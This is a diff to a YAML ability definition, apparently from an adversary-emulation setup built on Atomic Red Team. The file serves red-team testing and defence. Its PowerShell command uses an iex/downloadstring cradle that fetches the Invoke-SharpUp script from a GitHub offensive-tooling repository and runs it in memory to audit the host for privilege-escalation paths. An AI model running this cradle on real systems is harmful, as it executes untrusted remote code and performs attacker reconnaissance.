@@ -9,7 +9,8 @@
   platforms:
     windows:
       psh:
-        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');
+        command: $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');
           Invoke-SharpUp -command "audit"
   plugin: atomic
   singleton: false
@@ -17,11 +18,11 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - discovery
+  - atomic-red-team
   - t1082
   author: Atomic Red Team
   additional_info:
     technique_created: '2017-05-31T21:31:04.307Z'
     atomic_guid: efb79454-1101-4224-a4d0-30c9c8b29ffc
-    import_timestamp: '2025-09-02T03:07:42.067675Z'
+    import_timestamp: '2025-09-03T02:56:14.680065Z'
